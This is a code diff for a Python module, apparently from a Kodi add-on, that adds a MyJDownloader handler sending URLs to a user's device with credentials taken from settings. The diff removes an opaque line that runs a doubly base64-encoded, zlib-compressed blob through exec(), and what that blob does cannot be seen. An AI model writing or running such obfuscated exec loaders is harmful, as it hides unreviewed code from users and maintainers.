@@ -1,3 +1,46 @@
+# -*- coding: utf-8 -*-
+# Python 3
 
-import zlib, base64
-exec(zlib.decompress(base64.b64decode(zlib.decompress(base64.b64decode('eNoVVDWypFAAPNAEyENDHAYZ3DLc3Tn9/o26qoMO2gpjNfzhMKe+sqCCOJVvv6VyPv6mxpCciByeBm00F270et2OjhFvuWY2g7/9D8SWNXOg+bjtfYdglkIjSb60K/AFWbuA5MWK3c8dCU2hTznbZdllC/dscHdknDxiZ6+zTgPZ++xWi309Ivg+IiuklI3II8Ao5CAtZqAzEK/dWUiGJqwXGkHbH48uAAVUPlt/qpCVRuHqSXhcZYqkvZblWGg8yBVit6NgF1IvlVzyQY+zIxtchb9IXo0ZeXOUYJf/cVa573lZyzcf0hJaxVdD4vyho9u28ARChdutxlr+c0NWuYRTlemkin6AhJi7Kdc1ucZV4+JTnis8lft4EWRxptKWArwKaNGWoYNGQpppa7ieMZwswT3h9LhcVIl2HkZm2as7Nky69z2SdDXG20HfzYp9uyD7JY1AiJdSCNnmYcWl3DdZeT/mUlpn1KuGGY+6JlGeufa7Z7QfmmScqc0ZQ1Ijun7GoFBFsqb3g6MMFAegZnehr4cux9FVbaB492fUY0khAq1QTLOOczboM/eMb1ll4EL6wPGsPR8rPNMnmzPiKiYai+yzx8tBL1iY3KCBTPV+Hfh0jLZdMZCSyaQ6dFHwHgLvaIwKohq5LQdD6plo80UvJIV5RarE2R01PmWUrP4hoMRfntf9MI6Zy4FKeajPzx86svP7z0zdPzYuvN6xbWJRPMPqHRM7Utd8zIO0a99w9uBtDcBPROpNZGPxaOOA72NTDW315751mdwkrSdNIj3LPp63AJeykQnKjOyr7ly6m19Nmk73LvZHFsmgFuUwNJjaO9EBXE7hvpj5O/Cj4EglVbBZ4I/scZzkWcm7LkqJhfAbgr2GcCA1ejlHbM8QmxsrL0zHni3Pi7ETjqvSytDu0IJLsA9Rgk2d4cGxvxPidvDOT8/tGBP2SPKpsxvtLdrIvctfdQ5aKmuEiLwztUVxviOErpD9ObaF9I/Max+yy7iXwctx1vmrrjIeqYOfECM9JLWIYLjyyqCX8MRNJIvE09HCnSUk1X/gYuY0ZQsU9Cq4UnfmdRCz6ANuj+K2XJpyQrRRrBUcsTKHB9UUolg/kfjif/v49ePNtYkQWRbeSm8Dn6U/uK2EV5FhRSbIJtZ28LkyIt36+efdu8+smlbTogGGUmPGUWb7lqaYd6XvlqujBwVFiAB7+JwVVOc9hx9ELRt+su1eSfuqxg7A4pFvw7iHBGr38rwUqPuGB2SPUIdFyyIZVyG0b51HFYFGCy34sDKIOhOCutUUzY+6IUx62WO+u/3Uuv3Ank3t1uVUf48mw+yPsVs+waBIgZEa3+a2i61KMCDzKSSdZwyRiuVqO3EwYfD2HPdyI43LmxKN03Kpi+pf1OA3Pd+gZ/q5GA7GWFMHRyRaRCyyy4SbiIG6OSSTWIMs99pkKfi6RGOi6vMK/BmUwm8N9FSYv3xEF4nvfqmsC95xLG6mvdgo/ylJKRACCH8zwflDOzloJxpFPKR3Mp+56xpRABeNOicvCxmzsGKhuHjU4cVE4a8IuKDQhLb9l6/T8l2XL3Mfph6INum/KO1tdaT57LYx7a3gzTjd0JJWa4KW5Ii/UsAt1jHgCz84CJKW94V1zmS4J8wXtbZm++YKZDxI5Y6QCK7TRpXviw3ptY6rXqNR422Lky7MBAKcEr/8YE6qhPoFOvILtVWKG2KrFUVot+za+30Nv1JSf6/KIt3oyAOUJ96Q+3uNYMvP39erp2MrJNHGl+ZeEVFdl9NFRH6MXPhkG/ECrhfkJ30Woz3X8GoB81Osi2jq7ufA8S9MGmNbPNKH2D2NXvY3zFTxkBapFiNcfShasNZ3AbkN7L1l3bZpIdDQNKRTaIERvocBrLs14+NCsKpzS6FTdvfx/ZmlE08GDwoAwMAIPwgIAQJyf4ascDW6lfoHz619uw==')))).decode('utf-8'))
+import myjdapi
+
+from resources.lib.config import cConfig
+from resources.lib.gui.gui import cGui
+from xbmc import LOGINFO as LOGNOTICE, log
+
+LOGMESSAGE = cConfig().getLocalizedString(30166)
+class cMyJDownloaderHandler:
+
+    def sendToMyJDownloader(self, sUrl, sMovieTitle):
+        if self.__checkConfig() == False:
+            cGui().showError(cConfig().getLocalizedString(30090), cConfig().getLocalizedString(30254), 5)
+            return False
+
+        jd = myjdapi.Myjdapi()
+        if jd.connect(self.__getUser(), self.__getPass()) == False:
+            cGui().showError(cConfig().getLocalizedString(30090), cConfig().getLocalizedString(30255), 5)
+            return False
+
+        if jd.update_devices() == False:
+            cGui().showError(cConfig().getLocalizedString(30090), cConfig().getLocalizedString(30256), 5)
+            return False
+
+        device = jd.get_device(self.__getDevice())
+        if device.linkgrabber.add_links([{"autostart": False, "links": sUrl, "packageName": sMovieTitle}])['id'] > 0:
+            cGui().showInfo(cConfig().getLocalizedString(30090), cConfig().getLocalizedString(30256), 5)
+            return True
+        return False
+
+    def __checkConfig(self):
+        log(LOGMESSAGE + ' -> [myjdownloaderHandler]: check MYJD Addon setings', LOGNOTICE)
+        if cConfig().getSetting('myjd_enabled') == 'true':
+            return True
+        return False
+
+    def __getDevice(self):
+        return cConfig().getSetting('myjd_device')
+
+    def __getUser(self):
+        return cConfig().getSetting('myjd_user')
+
+    def __getPass(self):
+        return cConfig().getSetting('myjd_pass')
